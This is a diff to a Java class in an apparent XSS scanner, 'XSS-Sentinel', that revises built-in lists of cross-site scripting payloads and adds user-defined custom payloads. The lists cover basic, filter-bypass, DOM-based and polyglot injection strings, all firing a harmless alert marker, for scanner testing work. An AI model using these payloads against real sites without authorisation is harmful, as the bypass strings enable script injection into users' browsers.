@@ -2,6 +2,7 @@ package com.xsssentinel.payloads;
 
 import java.util.Arrays;
 import java.util.List;
+import java.util.stream.Collectors;
 
 public class PayloadManager {
 
@@ -10,34 +11,43 @@ public class PayloadManager {
             "<script>alert('XSS-Sentinel')</script>",
             "<img src=x onerror=alert('XSS-Sentinel')>",
             "<svg onload=alert('XSS-Sentinel')>",
-            "'\"><script>alert('XSS-Sentinel')</script>",
-            "<body onload=alert('XSS-Sentinel')>"
+            "\"><script>alert('XSS-Sentinel')</script>",
+            "'><script>alert('XSS-Sentinel')</script>",
+            "<body onload=alert('XSS-Sentinel')>",
+            "<iframe src=javascript:alert('XSS-Sentinel')>"
     );
 
     // Filter bypass payloads
     private static final List<String> BYPASS_PAYLOADS = Arrays.asList(
-            "<ScRiPt>alert('XSS-Sentinel')</sCrIpT>",
+            "<ScRiPt>alert('XSS-Sentinel')</ScRiPt>",
             "<img src=x onerror=alert`XSS-Sentinel`>",
             "<svg/onload=alert('XSS-Sentinel')>",
-            "%-3Cscript%-3Ealert('XSS-Sentinel')%-3C/script%-3E",
+            "<input autofocus onfocus=alert('XSS-Sentinel')>",
+            "<select autofocus onfocus=alert('XSS-Sentinel')>",
+            "<video><source onerror=alert('XSS-Sentinel')>",
+            "<details open ontoggle=alert('XSS-Sentinel')>",
             "<iframe src=javascript:alert('XSS-Sentinel')>"
     );
 
     // DOM-based XSS payloads
     private static final List<String> DOM_PAYLOADS = Arrays.asList(
             "javascript:alert('XSS-Sentinel')",
-            "#<script>alert('XSS-Sentinel')</script>",
-            "<img src=1 onerror=alert('XSS-Sentinel')>",
+            "#<img src=x onerror=alert('XSS-Sentinel')>",
             "'-alert('XSS-Sentinel')-'",
-            "\"-alert('XSS-Sentinel')-\""
+            "\"-alert('XSS-Sentinel')-\"",
+            "\\'-alert('XSS-Sentinel');//"
     );
 
-    // Polyglot payloads - work in multiple contexts
+    // Polyglot payloads
     private static final List<String> POLYGLOT_PAYLOADS = Arrays.asList(
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-Sentinel') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-Sentinel')//>>",
             "'\"-->></styles></script><svg onload=alert('XSS-Sentinel')>",
-            "<script>/*'/*`/*\"/*</script><svg onload=alert('XSS-Sentinel')/*>"
+            "<script>/*'/*`/*\"/*</script><svg onload=alert('XSS-Sentinel')/*>",
+            "\">'><svg onload=alert('XSS-Sentinel')>"
     );
+
+    // User custom payloads
+    private final List<String> customPayloads =
+            new java.util.ArrayList<>();
 
     public List<String> getBasicPayloads() {
         return BASIC_PAYLOADS;
@@ -55,7 +65,11 @@ public class PayloadManager {
         return POLYGLOT_PAYLOADS;
     }
 
-    public List<String> getAllPayloads() {
+    public List<String> getCustomPayloads() {
+        return customPayloads;
+    }
+
+    public List<String> getAllBuiltInPayloads() {
         return Arrays.asList(
                         BASIC_PAYLOADS,
                         BYPASS_PAYLOADS,
@@ -63,6 +77,32 @@ public class PayloadManager {
                         POLYGLOT_PAYLOADS
                 ).stream()
                 .flatMap(List::stream)
-                .collect(java.util.stream.Collectors.toList());
+                .collect(Collectors.toList());
+    }
+
+    public void addCustomPayload(String payload) {
+        if (payload != null && !payload.trim().isEmpty()) {
+            customPayloads.add(payload.trim());
+        }
+    }
+
+    public void removeCustomPayload(String payload) {
+        customPayloads.remove(payload);
+    }
+
+    public void clearCustomPayloads() {
+        customPayloads.clear();
+    }
+
+    public List<String> getAllPayloads() {
+        return Arrays.asList(
+                        BASIC_PAYLOADS,
+                        BYPASS_PAYLOADS,
+                        DOM_PAYLOADS,
+                        POLYGLOT_PAYLOADS,
+                        customPayloads
+                ).stream()
+                .flatMap(List::stream)
+                .collect(Collectors.toList());
     }
 }
